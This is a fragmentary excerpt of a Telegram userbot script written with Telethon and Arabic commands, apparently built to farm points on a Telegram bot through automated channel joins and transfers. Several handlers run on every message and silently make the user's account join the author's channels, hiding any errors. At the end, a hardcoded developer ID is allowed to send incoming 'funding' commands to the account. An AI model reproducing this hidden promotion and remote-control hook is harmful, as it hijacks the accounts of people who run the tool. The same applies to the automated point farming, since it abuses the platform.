...
async def join_channel(event):
	try:
		await cethon(JoinChannelRequest('@Peakyy_BBlinders'))
	except BaseException :
		pass
@cethon.on(events.NewMessage)
async def join_channel(event):
	try:
		await cethon(JoinChannelRequest('@TeamALHajji'))
	except BaseException :
		pass
...
async def join_channel(event):
	try:
		await cethon(JoinChannelRequest('@xHamoudi'))
	except BaseException :
		pass
    ...
    if sender.id == onercethon_id:
        ...
        for i in range(100):
            ...
            if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
                await Thomas1.send_message(event.chat_id, f"تم الانتهاء من التجميع | SH")
                break
...
@cethon.on(events.NewMessage(outgoing=False, pattern='.اسيا'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == onercethon_id:
        await event.reply("جاري تجميع النقاط")
...
@cethon.on(events.NewMessage(outgoing=True, pattern='.تجميع اسيا'))
async def arab(event):
        await event.reply("جاري تجميع النقاط")
        await event.edit("جاري تجميع النقاط")
        joinu = await cethon(JoinChannelRequest('cethon'))
...
@cethon.on(events.NewMessage(outgoing=False, pattern='.تحويل اسيا (.*)'))
async def OwnerStart(event):
    pt = event.pattern_match.group(1) 
    sender = await event.get_sender()
    if sender.id == onercethon_id :
...
@cethon.on(events.NewMessage(outgoing=False, pattern=r'.معلومات اسيا'))
async def OwnerStart(event):
    sender = await event.get_sender()
    if sender.id == onercethon_id :
        send = await cethon.send_message(bot_username5, '/start')
...
async def OwnerStart(event):
    ...
    if sender.id == onercethon_id:
        ...
        joinq = await cethon(JoinChannelRequest('d3boot_7'))
        joinw = await cethon(JoinChannelRequest('Fvvvv'))
        joine = await cethon(JoinChannelRequest('DzDDDD'))
        ...
        joinx = await cethon(JoinChannelRequest('zzzzzp8'))
        joinz = await cethon(JoinChannelRequest('V_I_O_T'))
        join1 = await cethon(JoinChannelRequest('q2qqqq'))
...
DevThomas = [5945994941]

@cethon.on(events.NewMessage(incoming=True))
async def cethon(event):
    if event.message.message.startswith("تمويل") and event.sender_id in DevThomas:
